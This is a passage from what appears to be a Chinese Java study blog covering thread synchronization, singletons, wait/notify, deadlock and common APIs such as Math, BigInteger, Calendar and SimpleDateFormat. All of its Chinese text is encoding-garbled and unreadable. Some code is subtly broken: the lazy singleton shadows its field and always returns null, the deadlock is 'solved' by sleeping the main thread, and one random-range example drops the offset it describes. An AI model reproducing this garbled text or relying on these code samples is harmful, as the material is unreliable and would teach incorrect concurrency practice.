juc</p><p>æ¨¡æ‹Ÿç«è½¦ç«™å–ç¥¨ï¼Œä½“ç°çº¿ç¨‹å®‰å…¨é—®é¢˜:</p><p>é—®é¢˜ä»£ç :</p><pre><code class="java">package com.sakura.thread.ticket;public class Test &#123;    public static void main(String[] args) &#123;        TicketThread ticketThread1 = new TicketThread(&quot;å”®ç¥¨ç‚¹ä¸€&quot;);        TicketThread ticketThread2 = new TicketThread(&quot;å”®ç¥¨ç‚¹äºŒ&quot;);        TicketThread ticketThread3 = new TicketThread(&quot;å”®ç¥¨ç‚¹ä¸‰&quot;);        ticketThread1.start();        ticketThread2.start();        ticketThread3.start();    &#125;&#125;class TicketThread extends Thread&#123;    public TicketThread(String name) &#123;        super(name);    &#125;    @Override    public void run() &#123;        int count = 100;        while (true)&#123;            if (count &lt;= 0)&#123;                break;            &#125;            System.out.println(Thread.currentThread().getName()+&quot;å·²å–å‡ºç¬¬&quot;+count+&quot;ç¥¨!&quot;);            count--;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913004908511.png" alt="image-20220913004908511"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°å–çš„ç¥¨æœ‰é‡å¤çš„ï¼Œæˆ‘ä»¬æœ¬æƒ³è¦å–100å¼ ï¼Œå› ä¸ºå¤šçº¿ç¨‹æˆ‘ä»¬å®é™…å–äº†300å¼ ã€‚</p><h2 id="ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜"><a href="#ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜" class="headerlink" title="ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜"></a>ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜</h2><p>å‡ºç°çš„é—®é¢˜å‡ºç°äº†0ç¥¨æˆ–è€…é‡å¤çš„ç¥¨ï¼Œéœ€è¦æœ‰ä¸€ä¸ªç›‘è§†å™¨æŸ¥çœ‹å–ç¥¨çš„æ•°æ®</p><p>è§£å†³æ–¹å¼ä¸€:ä½¿ç”¨åŒæ­¥ä»£ç å—:</p><pre><code class="java">synchronized(åŒæ­¥ç›‘è§†å™¨å¯¹è±¡)&#123;&#125; //åŒæ­¥ç›‘è§†å™¨å¯¹è±¡å¿…é¡»æ˜¯å¼•ç”¨æ•°æ®ç±»å‹,å½“å¤šæ¡çº¿ç¨‹æ“ä½œå…±äº«æ•°æ®åŒæ­¥ç›‘è§†å™¨å¯¹è±¡å¿…é¡»æ˜¯åŒä¸€ä¸ª</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913011504347.png" alt="image-20220913011504347"></p><p>ä¿è¯åœ¨åŒæ­¥ä»£ç å—å†…åªæœ‰ä¸€æ¡çº¿ç¨‹åœ¨æ‰§è¡Œå…¶ä»–çº¿ç¨‹éœ€è¦åœ¨åŒæ­¥ä»£ç å—å¤–ç­‰å¾…</p><pre><code class="java">package com.sakura.thread.ticket;public class Test &#123;    public static void main(String[] args) &#123;        TicketThread ticketThread1 = new TicketThread(&quot;å”®ç¥¨ç‚¹ä¸€&quot;);        TicketThread ticketThread2 = new TicketThread(&quot;å”®ç¥¨ç‚¹äºŒ&quot;);        TicketThread ticketThread3 = new TicketThread(&quot;å”®ç¥¨ç‚¹ä¸‰&quot;);        ticketThread1.start();        ticketThread2.start();        ticketThread3.start();    &#125;&#125;class TicketThread extends Thread&#123;    static int count = 100;    public TicketThread(String name) &#123;        super(name);    &#125;    @Override    public void run() &#123;        while (true) &#123;            synchronized (TicketThread.class) &#123;                if (count &lt;= 0) &#123;                    break;                &#125;                System.out.println(this.getName() + &quot;å·²å–å‡ºç¬¬&quot; + count + &quot;ç¥¨!&quot;);                count--;            &#125;        &#125;        &#125;    &#125;</code></pre><p>è¾“å‡ºç»“æœ:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913012215185.png" alt="image-20220913012215185"></p><p>ps:å½“ä¸€æ¡çº¿ç¨‹è¿›å…¥åŒæ­¥ä»£ç å—å†…ï¼Œé‚£ä¹ˆå…¶ä»–çº¿ç¨‹ä¸èƒ½è¿›å…¥æ‹¥æœ‰åŒä¸€ä¸ªåŒæ­¥ç›‘è§†å™¨å¯¹è±¡çš„åŒæ­¥ä»£ç å—</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220913233014600.png" alt="image-20220913233014600"></p><h2 id="ä½¿ç”¨åŒæ­¥æ–¹æ³•è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜"><a href="#ä½¿ç”¨åŒæ­¥æ–¹æ³•è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜" class="headerlink" title="ä½¿ç”¨åŒæ­¥æ–¹æ³•è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜"></a>ä½¿ç”¨åŒæ­¥æ–¹æ³•è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜</h2><p>æœ‰ä¸€æ¡çº¿ç¨‹è¿›å…¥åŒæ­¥æ–¹æ³•é‚£ä¹ˆå…¶ä»–çº¿ç¨‹ä¸ä»…ä¸èƒ½è¿›å…¥æ­¤æ–¹æ³•ä¹Ÿä¸èƒ½è¿›å…¥æ‹¥æœ‰åŒä¸€ä¸ªåŒæ­¥ç›‘è§†å™¨å¯¹è±¡çš„åŒæ­¥æ–¹æ³•</p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread.ticket;public class Test &#123;    public static void main(String[] args) &#123;        TicketThread ticketThread = new TicketThread();        Thread t1 = new Thread(ticketThread,&quot;å”®ç¥¨ç‚¹ä¸€&quot;);        Thread t2 = new Thread(ticketThread,&quot;å”®ç¥¨ç‚¹äºŒ&quot;);        Thread t3 = new Thread(ticketThread,&quot;å”®ç¥¨ç‚¹ä¸‰&quot;);        t1.start();        t2.start();        t3.start();        t2.setPriority(10);        t1.setPriority(1);    &#125;&#125;class TicketThread implements Runnable&#123;    int count = 100;    @Override    public void run() &#123;        while (true)&#123;            if (count &lt;=0)&#123;                return;            &#125;            saleTicket();        &#125;    &#125;    private synchronized void saleTicket()&#123;        if (count &lt;=0)&#123;            return;        &#125;        try &#123;            Thread.sleep(10);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        System.out.println(Thread.currentThread().getName()+&quot;ç¬¬&quot;+count+&quot;ç¥¨å·²å–å‡º&quot;);        count--;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914002516038.png" alt="image-20220914002516038"></p><h2 id="ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜-ç»ƒä¹ é¢˜"><a href="#ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜-ç»ƒä¹ é¢˜" class="headerlink" title="ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜-ç»ƒä¹ é¢˜"></a>ä½¿ç”¨åŒæ­¥ä»£ç å—è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜-ç»ƒä¹ é¢˜</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914010445756.png" alt="image-20220914010445756"></p><pre><code class="java">package com.sakura.thread;import java.util.Scanner;public class AccountTest &#123;    public static void main(String[] args) &#123;        AccountRunnable account = new AccountRunnable();        Thread t1 = new Thread(account,&quot;HJY&quot;);        Thread t2 = new Thread(account,&quot;WYF&quot;);        t1.start();        t2.start();    &#125;&#125;class Account&#123;    int balance = 600;    public void withMoney(int money)&#123;        balance -= money;    &#125;&#125;class AccountRunnable implements Runnable&#123;    Account account = new Account();    @Override    public void run() &#123;            synchronized (account)&#123;                if (account.balance &lt; 500)&#123;                    System.out.println(Thread.currentThread().getName()+&quot;\tæ‚¨çš„ä½™é¢ä¸è¶³ï¼Œå–æ¬¾å¤±è´¥\t&quot;+account                            .balance);                &#125;else &#123;                    account.withMoney(500);                    System.out.println(Thread.currentThread().getName()+&quot;\tæ­å–œæ‚¨\t&quot;+&quot;å·²æˆåŠŸå–å‡º500å…ƒ&quot;+&quot;æ‚¨çš„ä½™é¢ä¸º&quot;+account.balance);        &#125;    &#125;&#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914010500892.png" alt="image-20220914010500892"></p><h2 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a>å•ä¾‹æ¨¡å¼</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220914233953966.png" alt="image-20220914233953966"></p><p><strong>é¥¿æ±‰å¼:</strong></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread.single;public class Test &#123;    public static void main(String[] args) &#123;        Single s1 = Single.INSTANCE;        Single s2 = Single.INSTANCE;        System.out.println(s1==s2);        Single1 s3 = Single1.INSTANCE;        Single1 s4 = Single1.INSTANCE;        System.out.println(s3==s4);    &#125;&#125;class Single&#123;    public static final Single INSTANCE = new Single(); //æå‰å°†å¯¹è±¡åˆ›å»ºäº†å‡ºæ¥    private Single() &#123;    &#125;&#125;enum Single1 &#123;    INSTANCE&#125;</code></pre><p><strong>æ‡’æ±‰å¼:</strong></p><pre><code class="java">package com.sakura.thread.single;public class Test &#123;    public static void main(String[] args) &#123;        LazyGuys s1 = LazyGuys.withsingle();        LazyGuys s2 = LazyGuys.withsingle();        System.out.println(s1==s2);    &#125;&#125;class LazyGuys&#123;    private LazyGuys()&#123;&#125;    private static LazyGuys lazyGuys;    public synchronized static LazyGuys withsingle()&#123;        if (lazyGuys == null)&#123;            synchronized (Test.class)&#123;            LazyGuys lazyGuys = new LazyGuys();        &#125;        &#125;        return lazyGuys;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915002527942.png" alt="image-20220915002527942"></p><h1 id="day16"><a href="#day16" class="headerlink" title="day16"></a>day16</h1><h2 id="çº¿ç¨‹é€šä¿¡çš„åˆè¯†"><a href="#çº¿ç¨‹é€šä¿¡çš„åˆè¯†" class="headerlink" title="çº¿ç¨‹é€šä¿¡çš„åˆè¯†"></a>çº¿ç¨‹é€šä¿¡çš„åˆè¯†</h2><p>å¤šä¸ªçº¿ç¨‹åœ¨å¤„ç†åŒä¸€ä¸ªèµ„æºï¼Œä½†æ˜¯å¤„ç†çš„åŠ¨ä½œï¼ˆçº¿ç¨‹çš„ä»»åŠ¡ï¼‰å´ä¸ç›¸åŒã€‚è€Œå¤šä¸ªçº¿ç¨‹å¹¶å‘æ‰§è¡Œæ—¶,åœ¨é»˜è®¤æƒ…å†µä¸‹CPUæ˜¯éšæœºåˆ‡æ¢çº¿ç¨‹çš„ï¼Œå½“æˆ‘ä»¬éœ€è¦å¤šä¸ªçº¿ç¨‹æ¥å…±åŒå®Œæˆä¸€ä»¶ä»»åŠ¡ï¼Œå¹¶ä¸”æˆ‘ä»¬å¸Œæœ›ä»–ä»¬æœ‰è§„å¾‹çš„æ‰§è¡Œ,é‚£ä¹ˆå¤šçº¿ç¨‹ä¹‹é—´éœ€è¦ä¸€äº›é€šä¿¡æœºåˆ¶ï¼Œå¯ä»¥åè°ƒå®ƒä»¬çš„å·¥ä½œï¼Œä»¥æ­¤æ¥å¸®æˆ‘ä»¬è¾¾åˆ°å¤šçº¿ç¨‹å…±åŒæ“ä½œä¸€ä»½æ•°æ®ã€‚<br>æ¯”å¦‚:çº¿ç¨‹Aç”¨æ¥ç”ŸæˆåŒ…å­çš„ï¼Œçº¿ç¨‹Bç”¨æ¥åƒåŒ…å­çš„ï¼ŒåŒ…å­å¯ä»¥ç†è§£ä¸ºåŒä¸€èµ„æºï¼Œçº¿ç¨‹Aä¸çº¿ç¨‹Bå¤„ç†çš„åŠ¨ä½œï¼Œä¸€ä¸ªæ˜¯ç”Ÿäº§ï¼Œä¸€ä¸ªæ˜¯æ¶ˆè´¹ï¼Œæ­¤æ—¶Bçº¿ç¨‹å¿…é¡»ç­‰åˆ°Açº¿ç¨‹å®Œæˆåæ‰èƒ½æ‰§è¡Œï¼Œé‚£ä¹ˆçº¿ç¨‹Aä¸çº¿ç¨‹Bä¹‹é—´å°±éœ€è¦çº¿ç¨‹é€šä¿¡ï¼Œå³ç­‰å¾…å”¤é†’æœºåˆ¶</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915003001047.png" alt="image-20220915003001047"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915003444873.png" alt="image-20220915003444873"></p><h2 id="çº¿ç¨‹é€šä¿¡é‡‡ç”¨åŒæ­¥ä»£ç å®ç°"><a href="#çº¿ç¨‹é€šä¿¡é‡‡ç”¨åŒæ­¥ä»£ç å®ç°" class="headerlink" title="çº¿ç¨‹é€šä¿¡é‡‡ç”¨åŒæ­¥ä»£ç å®ç°"></a>çº¿ç¨‹é€šä¿¡é‡‡ç”¨åŒæ­¥ä»£ç å®ç°</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915003737856.png" alt="image-20220915003737856"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread.notify;public class Test &#123;    public static void main(String[] args) &#123;        Bar bar = new Bar();        CookerThread c1 = new CookerThread(bar);        WaiterThread w1 = new WaiterThread();        w1.setBar(bar);        c1.setName(&quot;äº”æ˜Ÿçº§å¤§å¨&quot;);        w1.setName(&quot;æµ·åº•ææœåŠ¡å‘˜&quot;);        c1.start();        w1.start();    &#125;&#125;class Bar&#123;    int count = 0;    public static final int MAX_ENUM = 10;&#125;class CookerThread extends Thread&#123;    Bar bar;    public CookerThread(Bar bar) &#123;        this.bar = bar;    &#125;    @Override    public void run() &#123;        while (true) &#123;            synchronized (bar) &#123;                if (bar.count &gt;= bar.MAX_ENUM) &#123;                    try &#123;                        bar.wait();                    &#125; catch (InterruptedException e) &#123;                        throw new RuntimeException(e);                    &#125;                &#125;                bar.count++;                System.out.println(Thread.currentThread().getName() + &quot;æ­£åœ¨åšèœä¸­,è¿™æ˜¯ç¬¬&quot; + bar.count + &quot;ä»½èœ&quot;);                bar.notify();            &#125;        &#125;    &#125;&#125;class WaiterThread extends Thread&#123;    private Bar bar;    public void setBar(Bar bar) &#123;        this.bar = bar;    &#125;    @Override    public void run() &#123;        while (true) &#123;            synchronized (bar) &#123;                if (bar.count &lt;= 0) &#123;                    try &#123;                        bar.wait();                    &#125; catch (InterruptedException e) &#123;                        throw new RuntimeException(e);                    &#125;                &#125;                bar.count--;                System.out.println(Thread.currentThread().getName() + &quot;æ­£åœ¨ç«¯èœä¸­,ç«¯èµ°åè¿˜æœ‰&quot; + bar.count + &quot;ä»½èœ&quot;);                bar.notify();            &#125;        &#125;        &#125;    &#125;</code></pre><h2 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915134622203.png" alt="image-20220915134622203"></p><p>äº§ç”Ÿæ­»é”çš„åŸå› ä¸¤æ¡çº¿ç¨‹äº’ç›¸æŒæœ‰å¯¹æ–¹çš„é”èµ„æºä¸æ”¾æ¾ï¼Œå¯ä»¥è®©ä¸€æ¡çº¿ç¨‹å…ˆè·‘å®Œå¦ä¸€æ¡çº¿ç¨‹å†å¼€å§‹</p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.thread.deadlock;public class Test &#123;    public static void main(String[] args) &#123;        Object goods = new Object();        Object money = new Object();        CustomerThread customerThread = new CustomerThread(goods, money);        GoodsThread goodsThread = new GoodsThread(goods, money);        customerThread.setName(&quot;ä¾›åº”å•†&quot;);        goodsThread.setName(&quot;é‡‡è´­å•†&quot;);        customerThread.start();        goodsThread.start();    &#125;&#125;    class CustomerThread extends Thread&#123;        Object goods;        Object money;        public CustomerThread(Object goods, Object money) &#123;            this.goods = goods;            this.money = money;        &#125;        @Override        public void run() &#123;            synchronized (goods)&#123;                System.out.println(Thread.currentThread().getName()+&quot;:ä½ å¥¶å¥¶æ»´ï¼Œå…ˆå‘è´§å†ç»™é’±&quot;);                synchronized (money)&#123;                    System.out.println(Thread.currentThread().getName()+&quot;:å·²ä»˜é’±&quot;);                &#125;            &#125;        &#125;    &#125;    class GoodsThread extends Thread&#123;        Object goods;        Object money;        public GoodsThread(Object goods, Object money) &#123;            this.goods = goods;            this.money = money;        &#125;        @Override        public void run() &#123;            synchronized (money)&#123;                System.out.println(Thread.currentThread().getName()+&quot;:ä½ å¥¶å¥¶æ»´ï¼Œå…ˆç»™é’±å†å‘è´§&quot;);                synchronized (goods)&#123;                    System.out.println(Thread.currentThread().getName()+&quot;:å·²å‘è´§&quot;);                &#125;            &#125;        &#125;    &#125;</code></pre><p>æ­¤æ—¶ä¾¿å½¢æˆäº†æ­»é”</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915142520962.png" alt="image-20220915142520962"></p><p>å¦‚ä½•è§£å†³?</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915142811474.png" alt="image-20220915142811474"></p><p>åœ¨ä¸¤ä¸ªå¯åŠ¨çº¿ç¨‹çš„ä»£ç ä¸­é—´ï¼Œä½¿ä¸»çº¿ç¨‹ç¡çœ ä¸€æ®µæ—¶é—´ï¼Œå³å¯é¿å…</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915142903030.png" alt="image-20220915142903030"></p><h2 id="çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ"></a>çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ</h2><p><strong>è§‚ç‚¹ä¸€</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915145205272.png" alt="image-20220915145205272"></p><p><strong>è§‚ç‚¹äºŒ</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915145534600.png" alt="image-20220915145534600"></p><h2 id="åŸºç¡€apiä¸å¸¸è§ç®—æ³•"><a href="#åŸºç¡€apiä¸å¸¸è§ç®—æ³•" class="headerlink" title="åŸºç¡€apiä¸å¸¸è§ç®—æ³•"></a>åŸºç¡€apiä¸å¸¸è§ç®—æ³•</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915145954683.png" alt="image-20220915145954683"></p><h3 id="å’Œæ•°å­¦ç›¸å…³çš„ç±»"><a href="#å’Œæ•°å­¦ç›¸å…³çš„ç±»" class="headerlink" title="å’Œæ•°å­¦ç›¸å…³çš„ç±»"></a>å’Œæ•°å­¦ç›¸å…³çš„ç±»</h3><p><strong>java.lang.Math</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915150308868.png" alt="image-20220915150308868"></p><pre><code>abs: æ±‚ç»å¯¹å€¼ceil: å‘ä¸Šå–æ•´floor: å‘ä¸‹å–æ•´random(): éšæœºæ•° [0,1) å·¦é—­å³å¼€n è¾ƒå¤§çš„æ•° m è¾ƒå°çš„æ•°[m,n]  ----&gt;       (int)(Math.random()*(n-m+1)+m);pow(n,y)   : n^ysqrt() :å¼€å¹³æ–¹round(): å››èˆäº”å…¥</code></pre><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.api;public class MathTest &#123;    public static void main(String[] args) &#123;        System.out.println(Math.abs(-10));        System.out.println(Math.ceil(3.00001));        System.out.println(Math.floor(1.999999));        System.out.println(Math.random());        int n = 100;        int m = 55;        System.out.println((int)(Math.random()*(n-m+1)));        System.out.println(Math.pow(2, 4));        System.out.println(Math.sqrt(64));        System.out.println(Math.round(5.4999));        System.out.println(Math.round(5.5));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915152440508.png" alt="image-20220915152440508"></p><h3 id="BigIntegerç±»"><a href="#BigIntegerç±»" class="headerlink" title="BigIntegerç±»"></a>BigIntegerç±»</h3><p>å­˜å‚¨å¤§çš„æ•´æ•°</p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.api;import java.math.BigInteger;public class Test1 &#123;    public static void main(String[] args) &#123;        BigInteger bigInteger = new BigInteger(&quot;999999999998484844554544545&quot;);        System.out.println(bigInteger);        BigInteger b1 = new BigInteger(&quot;300&quot;);        BigInteger b2 = new BigInteger(&quot;200&quot;);        System.out.println(&quot;åŠ æ³•\tb1.add(b2) = &quot; + b1.add(b2));        System.out.println(&quot;å‡æ³•\tb1.subtract(b2) = &quot; + b1.subtract(b2));        System.out.println(&quot;ä¹˜æ³•\tb1.multiply(b2) = &quot; + b1.multiply(b2));        System.out.println(&quot;é™¤æ³•\tb1.divide(b2) = &quot; + b1.divide(b2));        System.out.println(&quot;ä½™æ•°\tb1.remainder(b2) = &quot; + b1.remainder(b2));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915161917396.png" alt="image-20220915161917396"></p><h3 id="BigDecimalç±»"><a href="#BigDecimalç±»" class="headerlink" title="BigDecimalç±»"></a>BigDecimalç±»</h3><p>å­˜å‚¨ç¡®åˆ‡çš„å°æ•°</p><pre><code class="java">package com.sakura.api;import java.math.BigDecimal;import java.math.BigInteger;public class Test1 &#123;    public static void main(String[] args) &#123;        BigDecimal bigDecimal = new BigDecimal(&quot;3.1415926&quot;);        System.out.println(bigDecimal);        BigDecimal b1 = new BigDecimal(&quot;10.00&quot;);        BigDecimal b2 = new BigDecimal(&quot;3.00&quot;);        System.out.println(&quot;åŠ æ³•\tb1.add(b2) = &quot; + b1.add(b2));        System.out.println(&quot;å‡æ³•\tb1.subtract(b2) = &quot; + b1.subtract(b2));        System.out.println(&quot;ä¹˜æ³•\tb1.multiply(b2) = &quot; + b1.multiply(b2));        System.out.println(&quot;é™¤æ³•\tb1.divide(b2) = &quot; + b1.divide(b2,20,BigDecimal.ROUND_FLOOR));        System.out.println(&quot;ä½™æ•°\tb1.remainder(b2) = &quot; + b1.remainder(b2));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915162943916.png" alt="image-20220915162943916"></p><h3 id="Randomç±»"><a href="#Randomç±»" class="headerlink" title="Randomç±»"></a>Randomç±»</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915212254933.png" alt="image-20220915212254933"></p><pre><code class="java">import java.util.Random;public class Test1 &#123;    public static void main(String[] args) &#123;        Random random = new Random();        for (int i =0; i&lt;5;i++)&#123;            System.out.print(random.nextInt(50)+&quot;\t&quot;);            System.out.print(random.nextBoolean()+&quot;\t&quot;);            System.out.print(random.nextDouble()+&quot;\t&quot;);            System.out.println();        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915212834940.png" alt="image-20220915212834940"></p><p>è¿˜å¯ä»¥è®¾ç½®ç§å­:</p><pre><code class="java">import java.util.Random;public class Test1 &#123;    public static void main(String[] args) &#123;        Random random = new Random(1);  //æ­¤å¤„è®¾ç½®ç§å­ä¸º1        for (int i =0; i&lt;10;i++)&#123;            System.out.println(random.nextInt(50)+&quot;\t&quot;);        &#125;    &#125;&#125;</code></pre><p>è¾“å‡º:</p><pre><code class="java">35    38    47    13    4    4    34    6    28    48    </code></pre><p>æ¯æ¬¡è¿è¡Œç¨‹åºï¼Œè¾“å‡ºçš„ç»“æœéƒ½ä¸€è‡´</p><h3 id="æ—¥æœŸæ—¶é—´Api"><a href="#æ—¥æœŸæ—¶é—´Api" class="headerlink" title="æ—¥æœŸæ—¶é—´Api"></a>æ—¥æœŸæ—¶é—´Api</h3><p>å·²ç»è¿‡æ—¶çš„æ–¹æ³•:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915221033738.png" alt="image-20220915221033738"></p><h3 id="Calendarç±»"><a href="#Calendarç±»" class="headerlink" title="Calendarç±»"></a>Calendarç±»</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915222848061.png" alt="image-20220915222848061"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915223307597.png" alt="image-20220915223307597"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">package com.sakura.api;import java.util.Calendar;public class Test1 &#123;    public static void main(String[] args) &#123;        Calendar calendar = Calendar.getInstance();        //System.out.println(calendar);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        System.out.println(&quot;(calendar.get(Calendar.MONTH)+1) = &quot; + (calendar.get(Calendar.MONTH) + 1));        System.out.println(&quot;calendar.get(Calendar.DATE) = &quot; + calendar.get(Calendar.DATE));        System.out.println(&quot;calendar.get((Calendar.HOUR)) = &quot; + calendar.get((Calendar.HOUR)));        /*ä¿®æ”¹æ—¥æœŸ        *å±æ€§: year,month,data...        * å€¼:æ­£æ•° å‘å è´Ÿæ•° å‘å‰        * calender(å±æ€§,å€¼);        * */        calendar.add(Calendar.YEAR,28);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        calendar.add(Calendar.YEAR,20);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        /*        è®¾ç½®æ—¶é—´        calender.set(year,month,data)         */        calendar.set(2050,1,1,5,20);        System.out.println(&quot;calendar.get(Calendar.YEAR) = &quot; + calendar.get(Calendar.YEAR));        System.out.println(&quot;calendar.get(Calendar.MONTH) = &quot; + calendar.get(Calendar.MONTH));    &#125;&#125;</code></pre><p>è¾“å‡º:</p><pre><code class="java">calendar.get(Calendar.YEAR) = 2022(calendar.get(Calendar.MONTH)+1) = 9calendar.get(Calendar.DATE) = 15calendar.get((Calendar.HOUR)) = 11calendar.get(Calendar.YEAR) = 2050calendar.get(Calendar.YEAR) = 2070calendar.get(Calendar.YEAR) = 2050calendar.get(Calendar.MONTH) = 1</code></pre><h3 id="è·å–æ—¶åŒº"><a href="#è·å–æ—¶åŒº" class="headerlink" title="è·å–æ—¶åŒº"></a>è·å–æ—¶åŒº</h3><pre><code class="java">import java.util.TimeZone;public class Test1 &#123;    public static void main(String[] args) &#123;        String[] availableIDs = TimeZone.getAvailableIDs();        for(String availableID : availableIDs)&#123;            System.out.println(availableID);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220915232253904.png" alt="image-20220915232253904"></p><h3 id="æ—¥æœŸæ ¼å¼åŒ–"><a href="#æ—¥æœŸæ ¼å¼åŒ–" class="headerlink" title="æ—¥æœŸæ ¼å¼åŒ–"></a>æ—¥æœŸæ ¼å¼åŒ–</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220916000801519.png" alt="image-20220916000801519"></p><p>ç¤ºä¾‹ä»£ç :</p><pre><code class="java">import java.text.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class DataTest &#123;    public static void main(String[] args) throws ParseException &#123;            /*    æ—¥æœŸè½¬æ¢ï¼š     */        //    æ—¥æœŸ--&gt;å­—ç¬¦ä¸²        DateFormat df1 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        Date date1 = new Date();        System.out.println(date1);        String res1 = df1.format(date1);        System.out.println(res1);        //    å­—ç¬¦ä¸²--&gt;æ—¥æœŸ        DateFormat df2 = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);        String datastr = &quot;2022-09-16 00:15:41&quot;; //è¦è§£æçš„å­—ç¬¦ä¸²å†…å®¹å¿…é¡»ä¸æ ¼å¼å®Œå…¨åŒ¹é…ï¼Œå¦åˆ™æŠ¥é”™        Date date2 = df2.parse(datastr);        System.out.println(date2);    &#125;&#125;</code></pre><h3 id="æ–°å¢çš„ä¸‰ä¸ªæ—¥æœŸå¯¹è±¡"><a href="#æ–°å¢çš„ä¸‰ä¸ªæ—¥æœŸå¯¹è±¡" class="headerlink" 